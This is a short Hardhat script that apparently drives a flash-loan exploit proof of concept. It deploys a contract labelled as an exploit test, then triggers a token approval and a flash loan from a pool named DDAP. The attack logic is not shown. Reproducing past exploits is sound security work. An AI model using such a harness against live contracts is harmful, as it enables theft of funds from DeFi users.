// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
// const { expect } = require("chai");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // const [signer] = await ethers.getSigners();
  // console.log("signer address is: ",signer.address, "the balance of ETH is: ", await signer.getBalance());
  console.log("the block number is :", await ethers.provider.getBlockNumber());


  // const LUSD = await ethers.getContractFactory("MON_poc");
  const LUSD = await ethers.getContractFactory("flash_loan");
  const LUSD_test = await LUSD.deploy();
  await LUSD_test.deployed();
  console.log("FTS_exploit_test deployed to:", LUSD_test.address);


  await LUSD_test.set_approve_token();
  await LUSD_test.flashloan_from_DDAP();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });